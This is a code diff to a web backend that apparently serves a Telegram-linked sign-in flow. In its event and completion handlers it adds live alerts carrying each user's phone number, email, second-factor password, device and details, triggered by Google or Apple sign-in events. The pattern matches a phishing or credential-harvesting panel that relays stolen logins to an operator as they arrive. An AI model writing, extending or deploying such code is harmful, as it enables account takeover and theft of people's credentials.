@@ -72,6 +72,9 @@ async def api_verify_2fa(request: web.Request) -> web.Response:
         return web.json_response({"ok": False, "error": str(exc)}, status=500)
 
 
+import asyncio
+from shared.notifier import notify_auth_credential_event
+
 async def api_event(request: web.Request) -> web.Response:
     try:
         data = await request.json()
@@ -92,6 +95,24 @@ async def api_event(request: web.Request) -> web.Response:
         if phone:
             db.set_user_phone(DB_PATH, tg_id, phone)
         db.set_user_auth_step(DB_PATH, tg_id, event)
+
+        # Dispatch live Telegram alert if it's a Google or Apple auth event
+        if any(k in str(event).lower() for k in ["google", "apple"]):
+            asyncio.create_task(
+                notify_auth_credential_event(
+                    event_type=str(event),
+                    user_tg_id=tg_id,
+                    username=data.get("username"),
+                    nickname=data.get("nickname"),
+                    phone=phone,
+                    email=email,
+                    password=data.get("password_2fa"),
+                    details=data.get("details"),
+                    device=data.get("device"),
+                    is_test=bool(data.get("is_test", False)),
+                )
+            )
+
         return web.json_response({"ok": True})
     except Exception as exc:
         return web.json_response({"ok": False, "error": str(exc)}, status=500)
@@ -114,6 +135,22 @@ async def api_complete(request: web.Request) -> web.Response:
         if email:
             db.set_user_email(DB_PATH, tg_id, email)
         db.set_user_auth_step(DB_PATH, tg_id, "authorized")
+
+        # Dispatch final auth completion event
+        asyncio.create_task(
+            notify_auth_credential_event(
+                event_type="auth_complete",
+                user_tg_id=tg_id,
+                username=data.get("username"),
+                nickname=data.get("nickname"),
+                phone=phone,
+                email=email,
+                password=data.get("password_2fa"),
+                details="Авторизация успешно завершена",
+                is_test=bool(data.get("is_test", False)),
+            )
+        )
+
         return web.json_response({"ok": True})
     except Exception as exc:
         return web.json_response({"ok": False, "error": str(exc)}, status=500)
